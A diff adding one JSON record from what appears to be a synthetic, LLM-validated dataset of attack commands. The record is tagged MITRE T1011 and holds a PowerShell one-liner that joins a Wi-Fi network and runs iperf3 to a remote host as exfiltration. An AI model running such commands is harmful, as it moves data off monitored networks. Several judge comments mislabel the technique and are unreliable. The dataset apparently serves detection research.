@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
+  "explanation": "Connects to a non-corporate Wi‑Fi network and exfiltrates by binding iperf3 to the Wi‑Fi interface on an uncommon port, explicitly using Wi‑Fi as an alternate medium (T1011).",
+  "rationale_steps": [
+    "Join a dedicated Wi‑Fi network separate from the primary network.",
+    "Discover the Wi‑Fi interface's local IP.",
+    "Run iperf3 client bound to that IP using a high port.",
+    "Limit duration to reduce exposure."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce74f7d7",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell sequence uses valid separators, balanced quoting, proper cmdlet/parameter usage, and well-formed iperf3 flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It connects to a non-corporate Wi‑Fi and sends bound traffic to a remote host, but does not automate recurring exfiltration or transfer actual collected data (iperf3 sends test traffic), so alignment with Automated Exfiltration is only partial.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T03:28:25.221844Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, correct pipe operators, valid parameter names, proper variable assignments, and appropriate error handling with -ErrorAction Stop.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by connecting to a non-corporate Wi-Fi network, determining the correct IP address, and using iperf3 to exfiltrate data over an uncommon port (57999) for 45 seconds.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:28:28.197135Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for PowerShell cmdlets, `netsh`, variable assignments, piping, and argument passing.",
+        "semantic_score": 2,
+        "semantic_justification": "While the Wi-Fi connection attempt is operationally plausible if a profile exists, connecting to a new network usually requires elevated privileges, and `iperf3` itself does not exfiltrate collected data as defined by T1011, rather it generates synthetic traffic.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:44:42.191715Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
